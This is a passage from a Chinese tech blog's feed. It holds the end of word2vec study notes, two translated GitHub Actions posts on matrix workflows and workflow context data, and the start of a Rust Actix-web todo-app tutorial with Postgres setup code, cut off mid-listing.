Log-Bilinear Language Model， LBLc. Recurrent Neural Network based Language Model，RNNLMd. Collobert 和 Weston 在2008 年提出的 C&amp;W 模型e. Mikolov 等人提出了 CBOW（ Continuous Bagof-Words，连续词袋模型）和 Skip-gram 模型</p><p>CBOW和Skip-gram：</p><ul><li>如果是用一个词语作为输入，来预测它周围的上下文，那这个模型叫做“Skip-gram 模型”；</li><li>而如果是拿一个词语的上下文作为输入，来预测这个词语本身，则是 “CBOW 模型”。</li></ul><h4><span id="word2vec">word2vec</span></h4><p>实现CBOW和Skip-gram语言模型的工具（正如C&amp;W模型的实现工具是SENNA）。</p><h3><span id="cbow-he-skip-gram">CBOW和Skip-gram</span></h3><ol><li>原理</li><li>加速训练技巧：<ul><li>Negative Sample</li><li>Hierarchical Softmax</li></ul></li></ol><h2><span id="ying-yong">应用</span></h2><p>文本分类，个性化推荐，广告点击等</p><h2><span id="lun-wen-he-wen-zhang">论文和文章</span></h2><ol><li>Mikolov 两篇原论文：<ul><li>Distributed Representations of Sentences and Documents</li><li>Efficient estimation of word representations in vector space</li></ul></li><li>Yoav Goldberg 的论文：word2vec Explained- Deriving Mikolov et al.’s Negative-Sampling Word-Embedding Method</li><li>Xin Rong 的论文：word2vec Parameter Learning Explained</li><li>来斯惟的博士论文：《基于神经网络的词和文档语义向量表示方法研究》以及<a href="http://licstar.NET">博客</a></li><li><a href="https://www.zhihu.com/question/53011711">word2vec 相比之前的 Word Embedding 方法好在什么地方？</a></li><li>Sebastian 的博客：『On word embeddings - Part 2: Approximating the Softmax』</li><li>《How to Generate a Good Word Embedding?》,Siwei Lai, Kang Liu, Liheng Xu, Jun Zhao</li><li>《面向自然语言处理的分布式表示学习》，邱锡鹏</li><li>《Deep Learning 实战之 word2vec》</li><li>一些博文：<ul><li><a href="http://www.cnblogs.com/iloveai/p/word2vec.html">http://www.cnblogs.com/iloveai/p/word2vec.html</a></li><li><a href="http://www.hankcs.com/nlp/word2vec.html">http://www.hankcs.com/nlp/word2vec.html</a></li><li><a href="http://licstar.NET/archives/328">http://licstar.NET/archives/328</a></li><li><a href="https://zhuanlan.zhihu.com/p/22477976">https://zhuanlan.zhihu.com/p/22477976</a></li><li><a href="http://blog.csdn.Net/itplus/article/details/37969519">http://blog.csdn.Net/itplus/article/details/37969519</a></li><li><a href="http://www.tuicool.com/articles/fmuyamf">http://www.tuicool.com/articles/fmuyamf</a></li><li><a href="http://licstar.net/archives/620#comment-1542">http://licstar.net/archives/620#comment-1542</a></li><li><a href="http://blog.csdn.net/ycheng_sjtu/article/details/48520293">http://blog.csdn.net/ycheng_sjtu/article/details/48520293</a></li></ul></li></ol><h2><span id="ben-wen-can-kao">本文参考</span></h2><ul><li><a href="https://zhuanlan.zhihu.com/p/32590428">word embedding与word2vec: 入门词嵌入前的开胃菜</a></li><li><a href="https://zhuanlan.zhihu.com/p/26306795">秒懂词向量Word2vec的本质</a></li><li><a href="https://zhuanlan.zhihu.com/p/29076736">基于 word2vec 和 CNN 的文本分类 ：综述 &amp; 实践</a></li><li><a href="https://x-algo.cn/index.php/2016/03/12/281/">word2vec在工业界的应用场景</a></li><li><a href="https://www.zhihu.com/question/25269336/answer/49188284">word2vec有什么应用？ - orangeprince的回答 - 知乎</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      word2vec理解思路
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="深度学习" scheme="https://qiwihui.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第2天：矩阵工作流</title>
    <link href="https://qiwihui.com/qiwihui-blog-85/"/>
    <id>https://qiwihui.com/qiwihui-blog-85/</id>
    <published>2022-08-13T01:54:25.450Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>拥有 CI/CD 系统的最大优势之一是，它使你可以高效地构建和测试多种配置。在推送之前，你在机器上进行构建和测试当然是必要的，但这几乎是不够的。毕竟，你可能只安装了一个版本的节点。但是，在各种平台上构建将使你充满信心和洞察力，使你的更改可以在你支持的整个生态系统中发挥作用。</p><span id="more"></span><p><a href="https://www.jwz.org/blog/2011/08/weaponized-tinderbox/">Mozilla Tinderbox</a> 是最早引入跨多个配置构建概念的 CI 系统之一。这是革命性的──当我使用 <a href="https://www.abisource.com/">AbiWord</a> 时，我负责了 Tinderbox 的设置。我们有一个充满机器的实验室，以便我们可以测试 Motif 构建和 GTK 构建，并可以针对不同的依赖项进行测试（这是在从可怕的 libc5 到 libc6 迁移的时候），甚至是不同的 C ++ 编译器。</p><p>那时，我的工作很大一部分是维护这个装有昂贵计算机的实验室。因此，我最喜欢的 GitHub Actions 特性之一就是矩阵工作流功能也就不足为奇了，它使我能够快速运行多个构建以支持各种配置。</p><p>我仍然在编写代码，因此仍然需要使用不同的编译器和不同的依赖项进行构建。但是现在我不需要一个充满机器的实验室，我只需要在 GitHub Actions 中使用矩阵工作流设置即可。</p><p>矩阵工作流一开始可能看起来有些让人不知所措，但这实际上只是简单的变量替换。您定义了一组变量，以及应分配给每个变量的一组值。然后，GitHub Actions 将使用这些变量的所有不同扩展来执行工作流。</p><p>假设你要测试三个不同的变量，这很快变得非常强大。就我而言，我想用两个不同的 C 编译器（gcc和clang），三个不同的 SSL 后端（OpenSSL，GnuTLS和NSS）以及两个不同的 Kerberos 后端（MIT和Heimdal）进行测试。要测试所有这些不同的组合，那就是2 * 3 * 2 = 12种不同的配置。</p><p>但是，我不必定义十二个不同的工作（或更糟的是，必须像在糟糕的过去那样在实验室中设置十二个不同的机器），我只需指定一个包含三个变量的矩阵即可。如果在作业中指定矩阵，则实际上将获得十二个以不同排列运行的作业：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">matrix:</span></span><br><span class="line">  <span class="attr">cc:</span> [<span class="string">gcc</span>, <span class="string">clang</span>]</span><br><span class="line">  <span class="attr">curl:</span> [<span class="string">openssl</span>, <span class="string">gnutls</span>, <span class="string">nss</span>]</span><br><span class="line">  <span class="attr">kerberos:</span> [<span class="string">libkrb5</span>, <span class="string">heimdal</span>]</span><br></pre></td></tr></table></figure><p>现在在我的工作中，我可以使用<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/contexts-and-expression-syntax-for-github-actions">矩阵上下文</a>引用这些变量中的每一个。例如，<code>$&#123;&#123;matrix.cc&#125;&#125;</code> 将扩展为 cc 变量的当前值。</p><p>以下是一个示例工作流，该工作流安装每个依赖项，并运行我的 autoconf 设置，然后运行 make：</p><script src="https://gist.github.com/ethomson/5570201b04670fb90c1b0450db19e01a.js"></script><p>当你运行此工作流程时，你可以快速查看它如何扩展到12个不同的作业。在工作流运行的左侧，你可以看到它们中的每一个。 这样，简单的工作流程就可以迅速扩展。</p><p>在其中一个运行中打开步骤时，你可以看到确实我们能够安装依赖项。 如果打开 <code>build (clang, openssl, libkrb5)</code> 任务，实际上正在运行 <code>clang</code>（由 <code>$&#123;CC&#125; --version</code> 显示），libcurl的OpenSSL版本（由 <code>curl-config</code> 显示）和 MIT krb5（由 <code>krb5-config</code> 显示）。</p><p><img src="https://user-images.githubusercontent.com/3297411/77169169-07952200-6af4-11ea-8770-f381ddfaa7eb.png" alt="image"></p><p>因此，你可以看到，你只需使用工作流中的几行矩阵定义就可以构建具有多种配置的强大工作流。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_2_matrixes.html">https://www.edwardthomson.com/blog/github_actions_2_matrixes.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第2天：矩阵工作流
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第12天：有关工作流程的信息</title>
    <link href="https://qiwihui.com/qiwihui-blog-95/"/>
    <id>https://qiwihui.com/qiwihui-blog-95/</id>
    <published>2022-08-13T01:54:25.450Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>昨天我们看到GitHub为GitHub Actions工作流运行提供了一些信息，即 <code>GITHUB_TOKEN</code>。但这还不是全部。GitHub Actions还为你提供什么其他信息？</p><p>其实很多！</p><p>GitHub Actions <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/contexts-and-expression-syntax-for-github-actions#github-context">设置了许多信息“上下文”</a>，其中包含有关你的工作流程运行的数据。例如，github 上下文包含信息，例如你的工作流在其中运行的存储库的名称 <code>github.repository</code>，启动工作流的用户 <code>github.actor</code>。你可以使用与 <a href="https://qiwihui.com/qiwihui-blog-85/">处理矩阵</a> 和 <a href="https://qiwihui.com/qiwihui-blog-94/">密码</a> 相同的双弯括号扩展语法来引用它们。</p><span id="more"></span><script src="https://gist.github.com/ethomson/ef9e54a1dbef5dfa240833b9b6cc6e7e.js"></script><p><img src="https://user-images.githubusercontent.com/3297411/77735916-58ea6780-7046-11ea-851f-1d015a832fce.png" alt="image"></p><p>如果你想在上下文中查看GitHub Actions提供的所有信息，则可以实际使用方便的 <code>toJson</code> 函数来输出整个对象：</p><script src="https://gist.github.com/ethomson/fd59328c86a28792a13c553784ce54fb.js"></script><p><img src="https://user-images.githubusercontent.com/3297411/77735932-6142a280-7046-11ea-80c6-2f1e979b2888.png" alt="image"></p><p>如果这样做，你会注意到GitHub上下文中有很多信息。特别是，<code>github.event</code> 对象本身就是一块巨大的json数据。它基本上包含与触发器相对应的 <a href="https://developer.github.com/v3/activity/events/types/#pushevent">Webhook 信息</a>。</p><p>相同的事件信息已保存到磁盘上的 <code>github.event_path</code>。因此，你可以通过检查json blob来获取工作流程中的所有信息。幸运的是，非常方便的 <a href="https://stedolan.github.io/jq/">jq</a> 工具已安装在 runner 上。你可以使用它在命令行上分解json数据。</p><p>例如，如果我想获取存储库中的星标数量和fork数量，则可以 <code>jq</code> 用来解压缩保存在的json数据 <code>github.event_path</code>。</p><script src="https://gist.github.com/ethomson/d1756c60ada050a30f86da44bf1e5f29.js"></script><p><img src="https://user-images.githubusercontent.com/3297411/77735957-6c95ce00-7046-11ea-9c5d-eeafe7628594.png" alt="image"></p><p>GitHub Actions提供了大量有关存储库，触发运行的操作以及环境的数据，所有这些使你能够创建工作流以构建应用程序，部署应用程序或自动执行存储库中的某些任务。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_12_information_about_your_workflow.html">https://www.edwardthomson.com/blog/github_actions_12_information_about_your_workflow.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第12天：有关工作流程的信息
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>用 Rust Actix-web 写一个 Todo 应用（一）── Hello world 和 REST 接口</title>
    <link href="https://qiwihui.com/qiwihui-blog-105/"/>
    <id>https://qiwihui.com/qiwihui-blog-105/</id>
    <published>2022-08-13T01:54:25.440Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="actix">Actix</span></h2><p>actix 是 Rust 生态中的 Actor 系统。actix-web 是在 actix actor 框架和 Tokio 异步 IO 系统之上构建的高级 Web 框架。</p><p>本篇博客实践使用 actix-web 实现一个简单的 todo 应用。基本要求：了解 rust 基本语法，了解一定的 sql 和 docker 知识。</p><span id="more"></span><h2><span id="chuang-jian-yi-ge-hello-world-cheng-xu">创建一个 Hello world 程序</span></h2><p>首先，新建一个 <code>todo-list</code> 项目，并在其中增加 <code>actix-web</code> 依赖，我们使用最新的 actix 3.0。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cargo new todo-list</span><br><span class="line">cd todo-list</span><br></pre></td></tr></table></figure><p><code>Cargo.toml</code>：</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;todo-list&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">authors</span> = [<span class="string">&quot;qiwihui &lt;qwh005007@gmail.com&gt;&quot;</span>]</span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2018&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">actix-web</span> = <span class="string">&quot;3&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>main.rs</code> 中，使用类似于 python flask 的语法，增加一个最简单的 service。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_web::&#123;get, App, HttpServer, Responder&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io::<span class="type">Result</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// String 实现了 Responder trait</span></span><br><span class="line">    <span class="built_in">format!</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Starting server at http://127.0.0.1:8000&quot;</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">service</span>(hello))</span><br><span class="line">        .<span class="title function_ invoke__">bind</span>(<span class="string">&quot;127.0.0.1:8000&quot;</span>)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行并测试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cargo run</span><br></pre></td></tr></table></figure><p>在另一个终端中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:8000</span></span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure><h2><span id="shu-ju-ku-she-ji">数据库设计</span></h2><p>项目中将使用 postgres 作为数据库存储，为了方便操作和管理，我们使用 docker-compose 进行管理。</p><p><code>docker-compose.yml</code></p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:11-alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">postgres</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">POSTGRES_PASSWORD:</span> <span class="string">actix</span></span><br><span class="line">      <span class="attr">POSTGRES_USER:</span> <span class="string">actix</span></span><br><span class="line">      <span class="attr">POSTGRES_DB:</span> <span class="string">actix</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">5432</span><span class="string">:5432</span></span><br></pre></td></tr></table></figure><p>创建数据库：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>然后，我们设计整体数据库表结构，并创建一些基础数据作为测试。表结构如下：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> TodoList           TodoItem</span><br><span class="line">                   +---------+</span><br><span class="line">                   |  id     |</span><br><span class="line">+-------+          +---------+</span><br><span class="line">|  id   + &lt;-- FK --+ list_id |</span><br><span class="line">+-------+          +---------+</span><br><span class="line">| title |          | title   |</span><br><span class="line">+-------+          +---------+</span><br><span class="line">                   | checked |</span><br><span class="line">                   +---------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>database.sql</code> 中手动创建表结构并插入数据：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_list;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_list (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_item (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    checked <span class="type">boolean</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="literal">false</span>,</span><br><span class="line">    list_id <span class="type">integer</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">foreign</span> key (list_id) <span class="keyword">references</span> todo_list(id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">    todo_list (title)</span><br><span class="line"><span class="keyword">values</span></span><br><span class="line">    (<span class="string">&#x27;List 1&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;List 2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">    todo_item (title, list_id)</span><br><span class="line"><span class="keyword">values</span></span><br><span class="line">    (<span class="string">&#x27;item 1&#x27;</span>, <span class="number">1</span>),</span><br><span class="line">    (<span class="string">&#x27;item 2&#x27;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>创建数据表并查看结果</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">psql -h 127.0.0.1 -p 5432 -U actix actix &lt; database.sql</span> </span><br><span class="line">Password for user actix: </span><br><span class="line">NOTICE:  table &quot;todo_list&quot; does not exist, skipping</span><br><span class="line">DROP TABLE</span><br><span class="line">NOTICE:  table &quot;todo_item&quot; does not exist, skipping</span><br><span class="line">DROP TABLE</span><br><span class="line">CREATE TABLE</span><br><span class="line">CREATE TABLE</span><br><span class="line">INSERT 0 2</span><br><span class="line">INSERT 0 2</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">psql -h 127.0.0.1 -p 5432 -U actix actix</span></span><br><span class="line">Password for user actix: </span><br><span class="line">psql (12.4, server 11.9)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">actix=# \d</span><br><span class="line">              List of relations</span><br><span class="line"> Schema |       Name       |   Type   | Owner </span><br><span class="line">--------+------------------+----------+-------</span><br><span class="line"> public | todo_item        | table    | actix</span><br><span class="line"> public | todo_item_id_seq | sequence | actix</span><br><span class="line"> public | todo_list        | table    | actix</span><br><span class="line"> public | todo_list_id_seq | sequence | actix</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">actix=# select * from todo_list;</span><br><span class="line"> id | title  </span><br><span class="line">----+--------</span><br><span class="line">  1 | List 1</span><br><span class="line">  2 | List 2</span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure><h2><span id="huo-qu-todo-lie-biao">获取 todo 列表</span></h2><p>首先，添加我们需要的库，其中 <code>serde</code> 用于序列化，<code>tokio-postgres</code> 是一直支持异步的 PostgreSQL 客户端，<code>deadpool-postgres</code> 用于连接池的管理。</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">actix-web</span> = <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">serde</span>=<span class="string">&quot;1.0.117&quot;</span></span><br><span class="line"><span class="attr">deadpool-postgres</span> = <span class="string">&quot;0.5.0&quot;</span></span><br><span class="line"><span class="attr">tokio-postgres</span> = <span class="string">&quot;0.5.1&quot;</span></span><br></pre></td></tr></table></figure><p>增加 <code>models.rs</code> 用于管理数据模型，并支持序列化和反序列化。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoList</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoItem</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> checked: <span class="type">bool</span>,</span><br><span class="line">    <span class="keyword">pub</span> list_id: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加 <code>db.rs</code> 用于管理数据操作，例如 <code>get_todos</code> 从数据库中获取数据并序列化为 <code>TodoList</code> 的数组：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::models::&#123;TodoItem, TodoList&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::Client;</span><br><span class="line"><span class="keyword">use</span> std::io::Error;</span><br><span class="line"><span class="keyword">use</span> tokio_postgres::Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将每条记录转为 TodoList</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">row_to_todo</span>(row: &amp;Row) <span class="punctuation">-&gt;</span> TodoList &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">id</span>: <span class="type">i32</span> = row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">title</span>: <span class="type">String</span> = row.<span class="title function_ invoke__">get</span>(<span class="number">1</span>);</span><br><span class="line">    TodoList &#123; id, title &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_todos</span>(client: &amp;Client) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;TodoList&gt;, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">statement</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from todo_list order by id desc&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span> = client</span><br><span class="line">        .<span class="title function_ invoke__">query</span>(&amp;statement, &amp;[])</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error getting todo lists&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">iter</span>()</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|row| <span class="title function_ invoke__">row_to_todo</span>(row))</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;TodoList&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(todos)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加 <code>handlers.rs</code> 用于处理服务：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::db::get_todos;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;web, HttpResponse, Responder&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::&#123;Client, Pool&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(db_pool: web::Data&lt;Pool&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = db_pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = <span class="title function_ invoke__">get_todos</span>(&amp;client).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">match</span> result &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(todos) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todos),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，在 <code>main.rs</code> 中创建连接池并添加路由：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> db;</span><br><span class="line"><span class="keyword">mod</span> handlers;</span><br><span class="line"><span class="keyword">mod</span> models;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;get, web, App, HttpServer, Responder&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres;</span><br><span class="line"><span class="keyword">use</span> handlers::todos;</span><br><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> tokio_postgres::&#123;<span class="keyword">self</span>, NoTls&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="built_in">format!</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Starting server at http://127.0.0.1:8000&quot;</span>);</span><br><span class="line">    <span class="comment">// 创建连接池</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cfg</span> = tokio_postgres::Config::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    cfg.<span class="title function_ invoke__">host</span>(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">port</span>(<span class="number">5432</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">user</span>(<span class="string">&quot;actix&quot;</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">password</span>(<span class="string">&quot;actix&quot;</span>);</span><br><span class="line">    cfg.<span class="title function_ invoke__">dbname</span>(<span class="string">&quot;actix&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">mgr</span> = deadpool_postgres::Manager::<span class="title function_ invoke__">new</span>(cfg, NoTls);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = deadpool_postgres::Pool::<span class="title function_ invoke__">new</span>(mgr, <span class="number">100</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">data</span>(pool.<span 